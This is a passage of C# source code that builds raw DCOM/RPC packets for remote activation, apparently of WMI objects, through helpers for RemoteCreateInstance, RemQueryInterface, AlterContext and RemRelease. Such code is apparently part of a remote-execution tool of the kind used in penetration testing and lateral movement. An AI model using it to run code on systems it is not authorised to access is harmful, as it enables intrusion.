            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoInstantiatedObjectClsId",new byte[] {0x5e,0xf0,0xc3,0x8b,0x6b,0xd8,0xd0,0x11,0xa0,0x75,0x00,0xc0,0x4f,0xb6,0x88,0x20}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoClassContext",new byte[] {0x14,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoActivationFlags",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoFlagsSurrogate",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoInterfaceIdCount",new byte[] {0x01,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoInstantiationFlag",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIdsPtr",new byte[] {0x00,0x00,0x02,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationEntirePropertySize",new byte[] {0x58,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationVersionMajor",new byte[] {0x05,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationVersionMinor",new byte[] {0x07,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIdsPtrMaxCount",new byte[] {0x01,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIds",new byte[] {0x18,0xad,0x09,0xf3,0x6a,0xd8,0xd0,0x11,0xa0,0x75,0x00,0xc0,0x4f,0xb6,0x88,0x20}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIdsUnusedBuffer",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoCommonHeader",new byte[] {0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoPrivateHeader",new byte[] {0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientOk",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoReserved",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoReserved2",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoReserved3",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrReferentID",new byte[] {0x00,0x00,0x02,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoNULLPtr",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextUnknown",new byte[] {0x60,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextCntData",new byte[] {0x60,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFSignature",new byte[] {0x4d,0x45,0x4f,0x57}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFFlags",new byte[] {0x04,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFIID",new byte[] {0xc0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFCUSTOMOBJREFCLSID",new byte[] {0x3b,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFCUSTOMOBJREFCBExtension",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFCUSTOMOBJREFSize",new byte[] {0x30,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoUnusedBuffer",new byte[] {0x01,0x00,0x01,0x00,0x63,0x2c,0x80,0x2a,0xa5,0xd2,0xaf,0xdd,0x4d,0xc4,0xbb,0x37,0x4d,0x37,0x76,0xd7,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoCommonHeader",new byte[] {0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoPrivateHeader",privateHeader.ToArray()));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoAuthenticationFlags",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoPtrReferentID",new byte[] {0x00,0x00,0x02,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoNULLPtr",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoReserved",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameReferentID",new byte[] {0x04,0x00,0x02,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNULLPtr",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoReserved2",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameMaxCount",targetLength));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameOffset",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameActualCount",targetLength));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameString",targetUnicode));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoCommonHeader",new byte[] {0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoPrivateHeader",new byte[] {0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoNULLPtr",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoProcessID",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoApartmentID",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoContextID",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoCommonHeader",new byte[] {0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoPrivateHeader",new byte[] {0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoNULLPtr",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrReferentID",new byte[] {0x00,0x00,0x02,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestClientImpersonationLevel",new byte[] {0x02,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestNumProtocolSequences",new byte[] {0x01,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestUnknown",new byte[] {0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestProtocolSeqsArrayPtrReferentID",new byte[] {0x04,0x00,0x02,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestProtocolSeqsArrayPtrMaxCount",new byte[] {0x01,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestProtocolSeqsArrayPtrProtocolSeq",new byte[] {0x07,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoUnusedBuffer",new byte[] {0x00,0x00,0x00,0x00,0x00,0x00}));

            return dcomRemoteCreateInstance;
        }
        private static List<KeyValuePair<string, byte[]>> PacketDCOMRemQueryInterface(byte[] causalityId, byte[] ipId, byte[] iId)
        {
            List<KeyValuePair<string, byte[]>> dcomRemQueryInterface = new List<KeyValuePair<string, byte[]>>();
            dcomRemQueryInterface.Add(new KeyValuePair<string, byte[]>("VersionMajor", new byte[] {0x05,0x00}));
            dcomRemQueryInterface.Add(new KeyValuePair<string, byte[]>("VersionMinor",new byte[] {0x07,0x00}));
            dcomRemQueryInterface.Add(new KeyValuePair<string, byte[]>("Flags",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemQueryInterface.Add(new KeyValuePair<string, byte[]>("Reserved",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemQueryInterface.Add(new KeyValuePair<string, byte[]>("CausalityID",causalityId));
            dcomRemQueryInterface.Add(new KeyValuePair<string, byte[]>("Reserved2",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemQueryInterface.Add(new KeyValuePair<string, byte[]>("IPID",ipId));
            dcomRemQueryInterface.Add(new KeyValuePair<string, byte[]>("Refs",new byte[] {0x05,0x00,0x00,0x00}));
            dcomRemQueryInterface.Add(new KeyValuePair<string, byte[]>("IIDs",new byte[] {0x01,0x00}));
            dcomRemQueryInterface.Add(new KeyValuePair<string, byte[]>("Unknown",new byte[] {0x00,0x00,0x01,0x00,0x00,0x00}));
            dcomRemQueryInterface.Add(new KeyValuePair<string, byte[]>("IID",iId));

            return dcomRemQueryInterface;
        }

        private static List<KeyValuePair<string, byte[]>> PacketRPCAlterContext(byte[] packetAssocGroup, byte[] callId, byte[] contextId, byte[] interfaceUuid)
        {

            List<KeyValuePair<string, byte[]>> rpcAlterContext = new List<KeyValuePair<string, byte[]>>();
            rpcAlterContext.Add(new KeyValuePair<string, byte[]>("Version", new byte[] { 0x05 }));
            rpcAlterContext.Add(new KeyValuePair<string, byte[]>("VersionMinor",new byte[] {0x00}));
            rpcAlterContext.Add(new KeyValuePair<string, byte[]>("PacketType",new byte[] {0x0e}));
            rpcAlterContext.Add(new KeyValuePair<string, byte[]>("PacketFlags",new byte[] {0x03}));
            rpcAlterContext.Add(new KeyValuePair<string, byte[]>("DataRepresentation",new byte[] {0x10,0x00,0x00,0x00}));
            rpcAlterContext.Add(new KeyValuePair<string, byte[]>("FragLength",new byte[] {0x48,0x00}));
            rpcAlterContext.Add(new KeyValuePair<string, byte[]>("AuthLength",new byte[] {0x00,0x00}));
            rpcAlterContext.Add(new KeyValuePair<string, byte[]>("CallID", callId));
            rpcAlterContext.Add(new KeyValuePair<string, byte[]>("MaxXmitFrag",new byte[] {0xd0,0x16}));
            rpcAlterContext.Add(new KeyValuePair<string, byte[]>("MaxRecvFrag",new byte[] {0xd0,0x16}));
            rpcAlterContext.Add(new KeyValuePair<string, byte[]>("AssocGroup", packetAssocGroup));
            rpcAlterContext.Add(new KeyValuePair<string, byte[]>("NumCtxItems",new byte[] {0x01}));
            rpcAlterContext.Add(new KeyValuePair<string, byte[]>("Unknown",new byte[] {0x00,0x00,0x00}));
            rpcAlterContext.Add(new KeyValuePair<string, byte[]>("ContextID", contextId));
            rpcAlterContext.Add(new KeyValuePair<string, byte[]>("NumTransItems",new byte[] {0x01}));
            rpcAlterContext.Add(new KeyValuePair<string, byte[]>("Unknown2",new byte[] {0x00}));
            rpcAlterContext.Add(new KeyValuePair<string, byte[]>("Interface", interfaceUuid));
            rpcAlterContext.Add(new KeyValuePair<string, byte[]>("InterfaceVer",new byte[] {0x00,0x00}));
            rpcAlterContext.Add(new KeyValuePair<string, byte[]>("InterfaceVerMinor",new byte[] {0x00,0x00}));
            rpcAlterContext.Add(new KeyValuePair<string, byte[]>("TransferSyntax",new byte[] {0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60}));
            rpcAlterContext.Add(new KeyValuePair<string, byte[]>("TransferSyntaxVer",new byte[] {0x02,0x00,0x00,0x00}));

            return rpcAlterContext;
        }

        private static List<KeyValuePair<string, byte[]>> PacketDCOMRemRelease(byte[] causalityId, byte[] ipId, byte[] ipId2)
        {

            List<KeyValuePair<string, byte[]>> dcomRemRelease = new List<KeyValuePair<string, byte[]>>();
            dcomRemRelease.Add(new KeyValuePair<string, byte[]>("VersionMajor", new byte[] {0x05,0x00}));
            dcomRemRelease.Add(new KeyValuePair<string, byte[]>("VersionMinor",new byte[] {0x07,0x00}));
            dcomRemRelease.Add(new KeyValuePair<string, byte[]>("Flags",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemRelease.Add(new KeyValuePair<string, byte[]>("Reserved",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemRelease.Add(new KeyValuePair<string, byte[]>("CausalityID",causalityId));
            dcomRemRelease.Add(new KeyValuePair<string, byte[]>("Reserved2",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemRelease.Add(new KeyValuePair<string, byte[]>("Unknown",new byte[] {0x02,0x00,0x00,0x00}));
            dcomRemRelease.Add(new KeyValuePair<string, byte[]>("InterfaceRefs",new byte[] {0x02,0x00,0x00,0x00}));
            dcomRemRelease.Add(new KeyValuePair<string, byte[]>("IPID",ipId));
            dcomRemRelease.Add(new KeyValuePair<string, byte[]>("PublicRefs",new byte[] {0x05,0x00,0x00,0x00}));
            dcomRemRelease.Add(new KeyValuePair<string, byte[]>("PrivateRefs",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemRelease.Add(new KeyValuePair<string, byte[]>("IPID2",ipId2));
            dcomRemRelease.Add(new KeyValuePair<string, byte[]>("PublicRefs2",new byte[] {0x05,0x00,0x00,0x00}));
            dcomRemRelease.Add(new KeyValuePair<string, byte[]>("PrivateRefs2",new byte[] {0x00,0x00,0x00,0x00}));

            return dcomRemRelease;
        }

        private static byte[] ConvertFromSortedDictionary(List<KeyValuePair<string, byte[]>> dict)
        {
            List<byte> bytes = new List<byte>();
            foreach (KeyValuePair<string,byte[]> field in dict)
                bytes.AddRange(field.Value);

            return bytes.ToArray();
        }

        private static ushort GetUInt16DataLength(int start, byte[] data)
        {
            return BitConverter.ToUInt16(data.SubArray(start, 2),0);
        }
    }

    public static class Extensions
    {
        public static T[] SubArray<T>(this T[] data, int index, int length)
        {
            T[] result = new T[length];
            Array.Copy(data, index, result, 0, length);
            return result;
        }
    }
}

